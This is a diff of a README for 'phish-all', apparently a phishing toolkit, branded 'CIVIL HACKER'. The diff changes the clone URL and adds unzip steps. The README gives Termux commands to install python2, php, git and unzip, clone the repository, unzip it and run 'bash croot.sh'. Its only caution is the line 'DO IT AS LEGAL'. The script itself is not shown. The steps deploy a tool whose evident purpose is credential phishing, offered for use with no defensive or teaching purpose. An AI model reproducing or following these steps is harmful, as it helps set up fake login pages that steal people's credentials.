@@ -1,7 +1,6 @@
 # phish-all
 
 ______CIVIL HACKER________
-
 $ pkg update && pkg upgrade
 
 $ pkg install python2
@@ -22,13 +21,30 @@ $ pkg install php
 
 $ pkg install git
 
-$ git clone https://github.com/reyspeed/phish-all
+$ pkg install unzip
 
-$ cd phish-all
+$ git clone https://github.com/civilHacker/phish-all
+
+$ ls
+
+$cd phish-all
+
+$ ls
+
+$ unzip phish-all-master.zip
+
+$ cd phish-all-master
+
+$ ls
 
 $ bash croot.sh
 
+__________________________________________
+
+DO IT AS LEGAL
+ιηѕтαgяαм: CIVIL HACKER
+__________________________________________
 
 
-_________________________________________
-DO IT AS LEGAL!
+
+
